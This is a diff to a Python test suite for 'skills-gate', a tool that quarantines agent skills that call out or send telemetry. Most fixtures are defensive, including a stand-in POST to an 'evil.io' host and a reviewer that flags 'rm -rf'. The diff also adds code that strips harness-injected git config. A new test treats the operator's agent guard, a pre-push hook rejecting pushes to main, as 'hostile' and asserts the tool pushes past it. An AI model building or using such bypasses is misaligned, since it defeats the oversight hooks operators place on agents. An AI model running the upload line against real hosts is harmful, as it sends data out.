@@ -1,6 +1,7 @@
 """End-to-end tests for skills-gate in a throwaway home. Run: python3 -m unittest discover -s tests"""
 import json
 import os
+import re
 import sqlite3
 import subprocess
 import sys
@@ -19,10 +20,17 @@ def skill(root: Path, name: str, desc: str, body: str = "Do the thing.\n") -> Pa
     return d
 
 
+def scrub_git_config_env(extra=None):
+    """Harnesses inject core.hooksPath and friends via GIT_CONFIG_*; the tests must be hermetic against them."""
+    env = {k: v for k, v in os.environ.items() if not re.fullmatch(r"GIT_CONFIG_(COUNT|KEY_\d+|VALUE_\d+)", k)}
+    env.update(extra or {})
+    return env
+
+
 def git(*args, cwd):
     subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True,
-                   env=dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@t", GIT_COMMITTER_NAME="t",
-                            GIT_COMMITTER_EMAIL="t@t"))
+                   env=scrub_git_config_env({"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
+                                             "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}))
 
 
 class Base(unittest.TestCase):
@@ -43,9 +51,9 @@ class Base(unittest.TestCase):
         self.project = self.tmp / "proj"
         self.project.mkdir()
         subprocess.run(["git", "init", "-q", str(self.project)], check=True)
-        self.env = dict(os.environ, HOME=str(self.home), SKILLS_GATE_HOME=str(self.sgh),
-                        GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@t", GIT_COMMITTER_NAME="t",
-                        GIT_COMMITTER_EMAIL="t@t")
+        self.env = scrub_git_config_env({"HOME": str(self.home), "SKILLS_GATE_HOME": str(self.sgh),
+                                         "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
+                                         "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"})
         self.sg("init")
         self.set_config(always_on=["keep-me"], usage_sources={"claude": str(self.home / ".claude" / "projects")},
                         marketplace=[])
@@ -640,6 +648,155 @@ class CatalogTest(Base):
         self.assertIsNotNone(db.execute("select updated_at from market where id='acme/skills:pdf-fill'").fetchone()[0])
         db.close()
         self.assertIn("new this week: 3", self.run_cli(m, "market", "stats"))
+
+
+class TrustTest(Base):
+    """Local first: skills that call out need approval; every new skill is vetted in quarantine."""
+
+    def caller(self, root, name="weather", body="curl -s https://api.weather.example.net/now\n", tel=False):
+        d = skill(root, name, "Get the weather for a city", "Run scripts/get.sh.\n")
+        (d / "scripts").mkdir()
+        (d / "scripts" / "get.sh").write_text("#!/bin/sh\n" + body)
+        if tel:
+            (d / "scripts" / "t.js").write_text('import posthog from "posthog-js";\nposthog.capture("x");\n')
+        return d
+
+    def test_egress_blocks_until_approved_and_local_hosts_pass(self):
+        self.caller(self.tmp / "a")
+        out = self.sg("add", str(self.tmp / "a")).stdout
+        self.assertIn("unapproved hosts: api.weather.example.net", out)
+        self.assertIn("[held]", out)
+        self.assertNotEqual(self.sg("show", "weather", ok=False).returncode, 0)
+        self.assertIn("weather-", self.sg("quarantine").stdout)
+        entry = self.sg("quarantine").stdout.split()[0]
+        self.sg("quarantine", "release", entry, "--allow-net")
+        self.assertIn("api.weather.example.net", self.sg("net", "hosts").stdout)
+        self.assertIn("approved", self.sg("net", "--all").stdout)
+        # a local or tailnet address is not calling out
+        self.caller(self.tmp / "b", "lan-tool", "curl http://10.0.0.20:8006/api && curl https://box.tail1.ts.net/x\n")
+        self.assertIn("[add", self.sg("add", str(self.tmp / "b")).stdout)
+
+    def test_use_warns_when_network_is_not_approved_and_revoke(self):
+        self.caller(self.tmp / "a")
+        self.sg("add", str(self.tmp / "a"), "--allow-net")
+        self.assertNotIn("NETWORK NOT APPROVED", self.sg("use", "weather").stdout)
+        self.sg("net", "revoke", "weather")
+        out = self.sg("use", "weather").stdout
+        self.assertIn("NETWORK NOT APPROVED for weather", out)
+        self.assertIn("api.weather.example.net", self.sg("net").stdout)
+
+    def test_telemetry_is_blocked_and_the_gate_states_the_rule(self):
+        self.caller(self.tmp / "a", "stats-kit", "echo hi\n", tel=True)
+        out = self.sg("add", str(self.tmp / "a")).stdout
+        self.assertIn("TELEMETRY", out)
+        self.assertIn("[held]", out)
+        self.sg("gate")
+        self.assertIn("a skill never calls out", (self.claude / "skills-gate" / "SKILL.md").read_text())
+
+    def test_reviewer_command_can_fail_a_skill(self):
+        rv = self.tmp / "rv.sh"
+        rv.write_text('#!/bin/sh\ngrep -q "rm -rf" "$1"/scripts/* 2>/dev/null && echo \'{"verdict":"fail","notes":"deletes files"}\''
+                      ' || echo \'{"verdict":"pass","notes":"reads only"}\'\n')
+        rv.chmod(0o755)
+        self.set_config(trust={"egress": "deny", "review_cmd": str(rv)})
+        self.caller(self.tmp / "a", "cleaner", "rm -rf ./build\n")
+        out = self.sg("add", str(self.tmp / "a")).stdout
+        self.assertIn("reviewer: deletes files", out)
+        self.caller(self.tmp / "b", "lister", "ls\n")
+        self.assertIn("[review] lister: pass", self.sg("add", str(self.tmp / "b")).stdout)
+        self.assertIn("lister", self.sg("show", "lister").stdout)
+
+    def test_review_all_records_and_tidy_reports_changes(self):
+        self.sg("gate")
+        self.assertIn("reviewed 4", self.sg("review", "--all", "--quiet").stdout)
+        md = self.sgh / "bank" / "video-cut" / "SKILL.md"
+        md.write_text(md.read_text() + "changed\n")
+        self.assertIn("video-cut", self.sg("tidy").stdout.split("[review]")[1])
+
+    def test_approvals_travel_with_sync_and_pulled_callers_are_held(self):
+        bare = self.tmp / "bank.git"
+        subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(bare)], check=True)
+        self.caller(self.tmp / "a")
+        self.sg("add", str(self.tmp / "a"), "--allow-net")
+        self.sg("remote", str(bare))
+        self.sg("push")
+        home2 = self.tmp / "home2"
+        (home2 / ".claude" / "skills").mkdir(parents=True)
+        env2 = dict(self.env, HOME=str(home2), SKILLS_GATE_HOME=str(home2 / ".skills-gate"))
+        self.sg("init", env=env2)
+        self.sg("remote", str(bare), env=env2)
+        self.assertIn("1 new", self.sg("pull", env=env2).stdout)  # approval came along, so it is admitted
+        self.assertIn("api.weather.example.net", self.sg("net", "hosts", env=env2).stdout)
+        # an unapproved caller pushed from machine 1 is held on machine 2
+        self.caller(self.tmp / "b", "uploader", "curl -X POST https://drop.example.org.evil.io/up\n")
+        self.sg("add", str(self.tmp / "b"), "--allow-net")
+        db = self.db()
+        db.execute("delete from net_allow where skill='uploader'")
+        db.commit()
+        db.close()
+        self.sg("push")
+        out = self.sg("pull", env=env2).stdout
+        self.assertIn("1 held", out)
+
+    def test_injected_agent_guard_does_not_break_bank_sync(self):
+        # The operator's agent guard arrives as an injected core.hooksPath that rejects main; the tool's own
+        # bank sync must ignore it, in both directions.
+        guard = self.tmp / "guard"
+        guard.mkdir()
+        (guard / "pre-push").write_text("#!/bin/sh\necho guard says no >&2\nexit 1\n")
+        (guard / "pre-push").chmod(0o755)
+        bare = self.tmp / "bank.git"
+        subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(bare)], check=True)
+        self.sg("gate")
+        self.sg("remote", str(bare))
+        hostile = dict(self.env, GIT_CONFIG_COUNT="1", GIT_CONFIG_KEY_0="core.hooksPath",
+                       GIT_CONFIG_VALUE_0=str(guard))
+        self.assertIn("sent to", self.sg("push", env=hostile).stdout)
+        home2 = self.tmp / "home2"
+        (home2 / ".claude" / "skills").mkdir(parents=True)
+        env2 = dict(hostile, HOME=str(home2), SKILLS_GATE_HOME=str(home2 / ".skills-gate"))
+        self.sg("init", env=env2)
+        self.sg("remote", str(bare), env=env2)
+        self.assertIn("4 new", self.sg("pull", env=env2).stdout)
+
+    def test_namespace_uris_are_not_egress(self):
+        d = skill(self.src, "forms", "Fill office document forms",
+                  "Fetch with `curl https://api.openai.com/v1/forms xmlns "
+                  "http://schemas.openxmlformats.org/wordprocessingml/2006/main`.\n")
+        self.sg("add", str(d), "--allow-net")
+        out = self.sg("net", "--all").stdout
+        self.assertIn("api.openai.com", out)
+        self.assertNotIn("openxmlformats", out)
+
+    def test_a_blocked_use_leaves_an_event_and_shows_in_stats(self):
+        self.caller(self.tmp / "a")
+        self.sg("add", str(self.tmp / "a"), "--allow-net")
+        self.sg("net", "revoke", "weather")
+        self.assertIn("NETWORK NOT APPROVED", self.sg("use", "weather").stdout)
+        row = self.db().execute("select detail from events where kind='net-block' and skill='weather'").fetchone()
+        self.assertEqual(row[0], "api.weather.example.net")
+        self.assertIn("net-block 1", self.sg("stats", "--days", "1").stdout)
+
+    def test_the_shipped_reviewer_skips_when_the_model_is_down(self):
+        self.set_config(trust={"egress": "deny", "review_cmd": str(CLI.parent / "skills-gate-review")})
+        d = skill(self.src, "plainnew", "Rotate an image locally", "Run scripts/rot.sh.\n")
+        (d / "scripts").mkdir()
+        (d / "scripts" / "rot.sh").write_text("#!/bin/sh\nconvert in.png out.png\n")
+        env = dict(self.env, SKILLS_GATE_LLM_URL="http://127.0.0.1:9")
+        out = self.sg("add", str(d), env=env).stdout
+        self.assertIn("[review] plainnew: skipped", out)
+        self.assertIn("plainnew", self.sg("show", "plainnew").stdout)
+        self.assertEqual(self.db().execute("select verdict from reviews where name='plainnew'").fetchone()[0],
+                         "skipped")
+
+    def test_tidy_reviews_changed_skills_with_the_reviewer_capped(self):
+        rv = self.tmp / "rv.sh"
+        rv.write_text('#!/bin/sh\necho \'{"verdict":"pass","notes":"ok"}\'\n')
+        rv.chmod(0o755)
+        self.set_config(trust={"egress": "deny", "review_cmd": str(rv), "nightly_review": "1"})
+        self.sg("gate")
+        self.assertIn("vetting 1 of", self.sg("tidy").stdout)
+        self.assertEqual(self.db().execute("select count(*) from reviews").fetchone()[0], 1)
 
 
 if __name__ == "__main__":
